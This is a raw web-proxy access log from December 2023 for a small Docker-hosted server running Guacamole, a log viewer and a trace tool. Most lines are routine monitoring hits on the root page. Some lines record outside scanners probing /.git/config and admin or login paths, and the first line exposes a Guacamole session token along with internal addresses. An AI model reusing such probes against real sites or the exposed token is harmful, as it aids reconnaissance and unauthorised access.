173.48.140.140 - - [17/Dec/2023:06:03:57 +0000] "GET /guacamole/websocket-tunnel?token=1F3437EF09625352F92EDAAC1AD40C981C15FED3C7D5A879E5C7A0AEDA9C2BF3&GUAC_DATA_SOURCE=mysql&GUAC_ID=5&GUAC_TYPE=c&GUAC_WIDTH=1403&GUAC_HEIGHT=1305&GUAC_DPI=120&GUAC_TIMEZONE=America%2FNew_York&GUAC_AUDIO=audio%2FL8&GUAC_AUDIO=audio%2FL16&GUAC_IMAGE=image%2Fjpeg&GUAC_IMAGE=image%2Fpng&GUAC_IMAGE=image%2Fwebp HTTP/1.1" 0 0 "-" "-" 164 "guacamole@docker" "http://172.18.0.10:8080" 67531ms
173.48.140.140 - - [17/Dec/2023:06:05:05 +0000] "GET /guacamole/images/circle-arrows.svg HTTP/2.0" 200 1408 "-" "-" 178 "guacamole@docker" "http://172.18.0.10:8080" 6ms
173.48.140.140 - - [17/Dec/2023:06:05:05 +0000] "GET /guacamole/images/action-icons/guac-home.svg HTTP/2.0" 200 505 "-" "-" 177 "guacamole@docker" "http://172.18.0.10:8080" 11ms
173.48.140.140 - - [17/Dec/2023:06:05:05 +0000] "GET /guacamole/images/action-icons/guac-logout.svg HTTP/2.0" 200 1464 "-" "-" 179 "guacamole@docker" "http://172.18.0.10:8080" 8ms
173.48.140.140 - - [17/Dec/2023:06:05:07 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 180 "guacamole@docker" "http://172.18.0.10:8080" 14ms
173.48.140.140 - - [17/Dec/2023:06:05:07 +0000] "GET /guacamole/api/session/data/mysql-shared/activeConnections HTTP/2.0" 200 2 "-" "-" 182 "guacamole@docker" "http://172.18.0.10:8080" 16ms
173.48.140.140 - - [17/Dec/2023:06:05:07 +0000] "GET /guacamole/api/session/data/mysql/activeConnections HTTP/2.0" 200 2 "-" "-" 181 "guacamole@docker" "http://172.18.0.10:8080" 122ms
173.48.140.140 - - [17/Dec/2023:06:05:14 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3493 "-" "-" 183 "www@docker" "http://172.18.0.9:80" 15ms
159.203.109.206 - - [17/Dec/2023:06:05:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 184 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [17/Dec/2023:06:05:24 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3493 "-" "-" 185 "www@docker" "http://172.18.0.9:80" 14ms
173.48.140.140 - - [17/Dec/2023:06:05:34 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3493 "-" "-" 186 "www@docker" "http://172.18.0.9:80" 14ms
167.71.120.76 - - [17/Dec/2023:06:05:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 187 "www@docker" "http://172.18.0.9:80" 0ms
170.64.138.139 - - [17/Dec/2023:06:05:39 +0000] "GET /.git/config HTTP/1.1" 301 17 "-" "-" 188 "web-to-websecure@internal" "-" 0ms
170.64.138.139 - - [17/Dec/2023:06:05:40 +0000] "GET /.git/config HTTP/1.1" 404 19 "-" "-" 189 "-" "-" 0ms
173.48.140.140 - - [17/Dec/2023:06:05:44 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3421 "-" "-" 190 "www@docker" "http://172.18.0.9:80" 16ms
173.48.140.140 - - [17/Dec/2023:06:05:54 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3421 "-" "-" 191 "www@docker" "http://172.18.0.9:80" 13ms
173.48.140.140 - - [17/Dec/2023:06:06:04 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3417 "-" "-" 192 "www@docker" "http://172.18.0.9:80" 13ms
173.48.140.140 - - [17/Dec/2023:06:06:14 +0000] "GET /logs/logtail.php HTTP/2.0" 200 3053 "-" "-" 193 "www@docker" "http://172.18.0.9:80" 16ms
159.203.109.206 - - [17/Dec/2023:06:06:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 194 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [17/Dec/2023:06:06:24 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2965 "-" "-" 195 "www@docker" "http://172.18.0.9:80" 15ms
173.48.140.140 - - [17/Dec/2023:06:06:34 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2936 "-" "-" 196 "www@docker" "http://172.18.0.9:80" 24ms
167.71.120.76 - - [17/Dec/2023:06:06:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 197 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [17/Dec/2023:06:06:44 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2846 "-" "-" 198 "www@docker" "http://172.18.0.9:80" 14ms
173.48.140.140 - - [17/Dec/2023:06:07:16 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 199 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [17/Dec/2023:06:07:16 +0000] "GET /logs/styles.css?version=15 HTTP/2.0" 304 0 "-" "-" 200 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [17/Dec/2023:06:07:16 +0000] "GET /logs/logtail.php HTTP/2.0" 200 2852 "-" "-" 201 "www@docker" "http://172.18.0.9:80" 23ms
173.48.140.140 - - [17/Dec/2023:06:07:21 +0000] "GET /trace/ HTTP/2.0" 200 4094 "-" "-" 202 "livetrace@docker" "http://172.18.0.3:80" 72ms
173.48.140.140 - - [17/Dec/2023:06:07:24 +0000] "GET /trace/startping.php?id=3z5gyy25z HTTP/2.0" 200 105 "-" "-" 203 "livetrace@docker" "http://172.18.0.3:80" 7ms
173.48.140.140 - - [17/Dec/2023:06:07:24 +0000] "GET /trace/starttrace.php?id=1y9u51owk HTTP/2.0" 200 106 "-" "-" 204 "livetrace@docker" "http://172.18.0.3:80" 6ms
159.203.109.206 - - [17/Dec/2023:06:07:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 205 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [17/Dec/2023:06:07:25 +0000] "GET /trace/polltrace.php?id=1y9u51owk HTTP/2.0" 200 689 "-" "-" 207 "livetrace@docker" "http://172.18.0.3:80" 4ms
173.48.140.140 - - [17/Dec/2023:06:07:25 +0000] "GET /trace/pollping.php?id=3z5gyy25z HTTP/2.0" 200 89 "-" "-" 206 "livetrace@docker" "http://172.18.0.3:80" 7ms
173.48.140.140 - - [17/Dec/2023:06:07:26 +0000] "GET /trace/polltrace.php?id=1y9u51owk HTTP/2.0" 200 689 "-" "-" 209 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [17/Dec/2023:06:07:26 +0000] "GET /trace/pollping.php?id=3z5gyy25z HTTP/2.0" 200 90 "-" "-" 208 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [17/Dec/2023:06:07:27 +0000] "GET /trace/pollping.php?id=3z5gyy25z HTTP/2.0" 200 90 "-" "-" 210 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [17/Dec/2023:06:07:27 +0000] "GET /trace/polltrace.php?id=1y9u51owk HTTP/2.0" 200 689 "-" "-" 211 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [17/Dec/2023:06:07:28 +0000] "GET /trace/polltrace.php?id=1y9u51owk HTTP/2.0" 200 712 "-" "-" 213 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [17/Dec/2023:06:07:28 +0000] "GET /trace/pollping.php?id=3z5gyy25z HTTP/2.0" 200 91 "-" "-" 212 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [17/Dec/2023:06:07:29 +0000] "GET /trace/pollping.php?id=3z5gyy25z HTTP/2.0" 200 91 "-" "-" 214 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [17/Dec/2023:06:07:29 +0000] "GET /trace/polltrace.php?id=1y9u51owk HTTP/2.0" 200 712 "-" "-" 215 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [17/Dec/2023:06:07:30 +0000] "GET /trace/pollping.php?id=3z5gyy25z HTTP/2.0" 200 90 "-" "-" 216 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [17/Dec/2023:06:07:30 +0000] "GET /trace/polltrace.php?id=1y9u51owk HTTP/2.0" 200 712 "-" "-" 217 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [17/Dec/2023:06:07:31 +0000] "GET /trace/polltrace.php?id=1y9u51owk HTTP/2.0" 200 714 "-" "-" 219 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [17/Dec/2023:06:07:31 +0000] "GET /trace/pollping.php?id=3z5gyy25z HTTP/2.0" 200 90 "-" "-" 218 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [17/Dec/2023:06:07:32 +0000] "GET /trace/polltrace.php?id=1y9u51owk HTTP/2.0" 200 714 "-" "-" 221 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [17/Dec/2023:06:07:32 +0000] "GET /trace/pollping.php?id=3z5gyy25z HTTP/2.0" 200 100 "-" "-" 220 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [17/Dec/2023:06:07:32 +0000] "GET /trace/cleanping.php?id=3z5gyy25z HTTP/2.0" 200 71 "-" "-" 222 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [17/Dec/2023:06:07:33 +0000] "GET /trace/polltrace.php?id=1y9u51owk HTTP/2.0" 200 714 "-" "-" 223 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [17/Dec/2023:06:07:34 +0000] "GET /trace/polltrace.php?id=1y9u51owk HTTP/2.0" 200 968 "-" "-" 224 "livetrace@docker" "http://172.18.0.3:80" 1ms
167.71.120.76 - - [17/Dec/2023:06:07:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 225 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:08:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 226 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:08:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 227 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:09:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 228 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:06:09:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 229 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:10:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 230 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:10:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 231 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:06:11:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 232 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:06:11:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 233 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:06:12:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 234 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:12:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 235 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:13:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 236 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:13:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 237 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:14:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 238 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:14:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 239 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:15:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 240 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:15:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 241 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:16:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 242 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:16:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 243 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:17:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 244 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:17:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 245 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:18:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 246 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:18:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 247 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:19:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 248 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:19:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 249 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:20:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 250 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:20:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 251 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:21:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 252 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:21:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 253 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:06:22:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 254 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:06:22:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 255 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:06:23:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 256 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:23:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 257 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:24:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 258 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:24:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 259 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:25:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 260 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:06:25:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 261 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:26:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 262 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:26:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 263 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:27:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 264 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:06:27:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 265 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:06:28:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 266 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:28:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 267 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:29:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 268 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:29:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 269 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:30:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 270 "www@docker" "http://172.18.0.9:80" 0ms
185.224.128.191 - - [17/Dec/2023:06:30:38 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 271 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [17/Dec/2023:06:30:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 272 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:06:31:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 273 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:31:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 274 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:32:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 275 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:32:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 276 "www@docker" "http://172.18.0.9:80" 3ms
159.203.109.206 - - [17/Dec/2023:06:33:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 277 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:06:33:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 278 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:34:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 279 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:34:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 280 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:35:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 281 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:35:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 282 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:36:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 283 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:36:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 284 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:37:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 285 "www@docker" "http://172.18.0.9:80" 0ms
34.77.127.183 - - [17/Dec/2023:06:37:37 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 286 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:06:37:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 287 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:38:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 288 "www@docker" "http://172.18.0.9:80" 10ms
167.71.120.76 - - [17/Dec/2023:06:38:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 289 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:39:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 290 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:06:39:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 291 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:40:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 292 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:40:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 293 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:06:41:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 294 "www@docker" "http://172.18.0.9:80" 1ms
185.224.128.191 - - [17/Dec/2023:06:41:30 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 295 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [17/Dec/2023:06:41:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 296 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:42:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 297 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:42:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 298 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:06:43:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 299 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:43:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 300 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:06:44:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 301 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:44:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 302 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:45:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 303 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:45:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 304 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:46:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 305 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:46:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 306 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:47:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 307 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:47:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 308 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:48:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 309 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:48:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 310 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:49:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 311 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:06:49:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 312 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:50:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 313 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:50:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 314 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:51:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 315 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:06:51:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 316 "www@docker" "http://172.18.0.9:80" 1ms
36.67.215.227 - - [17/Dec/2023:06:52:03 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 317 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:06:52:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 318 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:06:52:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 319 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:53:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 320 "www@docker" "http://172.18.0.9:80" 0ms
52.56.195.196 - - [17/Dec/2023:06:53:36 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 321 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:06:53:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 322 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:54:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 323 "www@docker" "http://172.18.0.9:80" 0ms
52.56.195.196 - - [17/Dec/2023:06:54:37 +0000] "GET /favicon.ico HTTP/1.1" 301 17 "-" "-" 324 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [17/Dec/2023:06:54:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 325 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:06:55:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 326 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:55:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 327 "www@docker" "http://172.18.0.9:80" 1ms
52.56.195.196 - - [17/Dec/2023:06:55:41 +0000] "GET /manage/account/login HTTP/1.1" 404 19 "-" "-" 328 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:06:56:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 329 "www@docker" "http://172.18.0.9:80" 0ms
52.56.195.196 - - [17/Dec/2023:06:56:38 +0000] "GET /manage/account/login HTTP/1.1" 301 17 "-" "-" 330 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [17/Dec/2023:06:56:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 331 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:06:57:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 332 "www@docker" "http://172.18.0.9:80" 2ms
167.71.120.76 - - [17/Dec/2023:06:57:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 333 "www@docker" "http://172.18.0.9:80" 0ms
52.56.195.196 - - [17/Dec/2023:06:58:22 +0000] "GET /admin/index.html HTTP/1.1" 404 19 "-" "-" 334 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:06:58:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 335 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:58:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 336 "www@docker" "http://172.18.0.9:80" 0ms
52.56.195.196 - - [17/Dec/2023:06:59:18 +0000] "GET /admin/index.html HTTP/1.1" 301 17 "-" "-" 337 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:06:59:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 338 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:06:59:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 339 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:07:00:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 340 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:07:00:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 341 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [17/Dec/2023:07:01:16 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 342 "web-to-websecure@internal" "-" 0ms
52.56.195.196 - - [17/Dec/2023:07:01:17 +0000] "GET /index.html HTTP/1.1" 404 19 "-" "-" 343 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:07:01:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 344 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:07:01:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 345 "www@docker" "http://172.18.0.9:80" 1ms
52.56.195.196 - - [17/Dec/2023:07:02:13 +0000] "GET /index.html HTTP/1.1" 301 17 "-" "-" 346 "web-to-websecure@internal" "-" 0ms
162.216.149.29 - - [17/Dec/2023:07:02:21 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 347 "web-to-websecure@internal" "-" 0ms
162.216.149.29 - - [17/Dec/2023:07:02:22 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 348 "-" "-" 0ms
